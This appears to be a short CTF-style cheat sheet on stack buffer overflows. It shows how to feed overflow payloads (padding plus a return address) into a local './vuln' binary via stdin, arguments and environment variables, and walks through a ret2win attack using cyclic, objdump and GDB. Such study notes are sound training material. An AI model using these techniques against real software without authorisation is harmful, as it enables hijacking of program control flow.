# Stack Based Buffer Overflows

## Basics

Look for dangerous methods such as "gets()"  
- These do not check the length of the input and simply retreive all that is given  

## Passing Input

If input is retreived after the program has started:  

```bash
python2 -c 'print("A"*64 + "\x9d\x06\x40\x00\x00\x00\x00\x00")' | ./vuln
```

If the input needs to be provided as a commandline arg, place it in backticks (\`):  

```bash
./vuln `python2 -c 'print("A"*64 + "\x9d\x06\x40\x00\x00\x00\x00\x00")'`
```

## Environment Variables

If environment variables are pulled into the binary, you can set variables to print shellcode  

```bash
export EnvVar=`python2 -c 'print("A"*64 + "\xef\xbe\xad\xde")'`
./vuln
```

## RET2WIN (w/out ASLR or PIE)

1. Find the number of chars to overwrite the return address

```bash
# sudo apt install python3-pwntools
cyclic 100
```

2. Supply the above output to the appropriate input
3. In a debugger or from the terminal output, take the supplied return address, convert it to ascii and reverse it
4. Supply this value back to `cyclic`

```bash
cyclic -l waaa
```

5. Use `objdump` or a debugger to find the WIN address

```bash
objdump -d vuln
# or in GDB
i functions
```

6. Send the payload

```bash
python2 -c 'print("A"*88 + "\xef\xbe\xad\xde")' | ./vuln
```















